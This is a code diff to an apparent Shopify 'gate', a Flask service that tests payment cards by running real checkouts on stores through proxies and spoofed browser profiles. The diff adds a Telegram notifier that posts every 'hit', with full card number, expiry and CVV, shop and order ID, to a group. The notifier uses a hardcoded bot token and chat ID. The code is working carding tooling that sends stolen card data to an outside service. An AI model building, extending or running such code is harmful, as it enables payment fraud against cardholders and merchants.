@@ -4,6 +4,7 @@ Shopify Gate v3 — fresh build.
 Lean flow: discovery -> checkout init -> 2 proposals -> PCI (4 vaults) ->
 submit (renegotiation+retries) -> poll verdict.
 Fallback transport: /checkouts/unstable/graphql with full documents.
+Telegram notifier: pushes ORDER_PAID / INSUFFICIENT_FUNDS hits to a group.
 """
 import base64
 import html as htmllib
@@ -14,6 +15,8 @@ import re
 import threading
 import time
 import urllib.parse
+import urllib.request
+import urllib.error
 
 from flask import Flask, request, jsonify
 from curl_cffi import requests as curl_requests
@@ -22,6 +25,61 @@ app = Flask(__name__)
 
 PORT = int(os.environ.get("PORT", "8090"))
 
+# ────────────────────────────────────────────────────────────
+# TELEGRAM NOTIFIER
+# ────────────────────────────────────────────────────────────
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9039355214:AAEJ3cyFXzNcz7tRma5cW-xMvg-LIzM2Fgo")
+TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "-1003891414952")
+
+
+def _tg_send(text):
+    """Fire-and-forget push to the Telegram group. Never blocks checkout."""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = urllib.parse.urlencode({
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": text,
+            "parse_mode": "HTML",
+            "disable_web_page_preview": "true",
+        }).encode()
+        req = urllib.request.Request(url, data=data, method="POST")
+        with urllib.request.urlopen(req, timeout=8) as r:
+            if r.status != 200:
+                print(f"[tg] non-200: {r.status}", flush=True)
+    except Exception as e:
+        print(f"[tg] fail: {e}", flush=True)
+
+
+def _tg_push_hit(card, currency, result, variant, proxy_status, shop_url):
+    """Build and send a hit message. Runs on a daemon thread."""
+    try:
+        response = "ORDER_PAID" if result.get("status") == "charged" else result.get("code", "")
+        site_clean = (shop_url or "").replace("https://", "").replace("http://", "").rstrip("/") or "unknown"
+        card_str = f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
+        amount = result.get("amount") or (variant.get("price") if variant else "")
+        try:
+            price_fmt = f"{float(amount):.2f}"
+        except (ValueError, TypeError):
+            price_fmt = str(amount) if amount else "0.00"
+        emoji = "💳" if response == "ORDER_PAID" else "💰"
+        msg = (
+            f"<b>{emoji} HIT — {response}</b>\n"
+            f"<b>Site:</b> {site_clean}\n"
+            f"<b>Card:</b> <code>{card_str}</code>\n"
+            f"<b>Price:</b> {price_fmt} {currency or ''}\n"
+            f"<b>Gateway:</b> {result.get('gate','') or 'shopify_payments'}\n"
+            f"<b>Proxy:</b> {proxy_status or 'not used'}"
+        )
+        if result.get("order_id"):
+            msg += f"\n<b>Order ID:</b> <code>{result['order_id']}</code>"
+        threading.Thread(target=_tg_send, args=(msg,), daemon=True).start()
+    except Exception as e:
+        print(f"[tg] build fail: {e}", flush=True)
+
+
+# ────────────────────────────────────────────────────────────
+# PACING
+# ────────────────────────────────────────────────────────────
 _SHOP_PACE = {}
 
 
@@ -33,6 +91,7 @@ def _pace(shop_url):
     if wait > 0:
         time.sleep(wait)
     _SHOP_PACE[shop_url] = time.time()
+
 
 BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]
 
@@ -1741,7 +1800,7 @@ def _map_code(result):
     return "ERROR"
 
 
-def _respond(card, currency, result, variant, proxy_status="not used"):
+def _respond(card, currency, result, variant, proxy_status="not used", shop_url=""):
     code = _map_code(result)
     response = code
     st = result.get("status", "error")
@@ -1752,6 +1811,11 @@ def _respond(card, currency, result, variant, proxy_status="not used"):
     elif st == "declined":
         response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
     status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"
+
+    # ── Telegram push on HIT (ORDER_PAID / INSUFFICIENT_FUNDS) ──
+    if status_str == "true":
+        _tg_push_hit(card, currency, result, variant, proxy_status, shop_url)
+
     print(f"[resp] code={response} status={status_str} step={result.get('step','')} err={str(result.get('error',''))[:80]}", flush=True)
     return jsonify({
         "CC": f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}",
@@ -1920,7 +1984,7 @@ def shopii_persisted():
                 leg = legacy_checkout(shop_url, variant, card, proxy)
                 if leg.get("status") in ("charged", "approved", "declined"):
                     result = leg
-        return _respond(card, currency, result, variant, proxy_status)
+        return _respond(card, currency, result, variant, proxy_status, shop_url)
     except Exception as e:
         return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                         "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
@@ -1977,7 +2041,7 @@ def shopii_graphql():
             leg = legacy_checkout(shop_url, variant, card, proxy)
             if leg.get("status") in ("charged", "approved", "declined"):
                 result = leg
-        return _respond(card, currency, result, variant, proxy_status)
+        return _respond(card, currency, result, variant, proxy_status, shop_url)
     except Exception as e:
         return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
                         "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
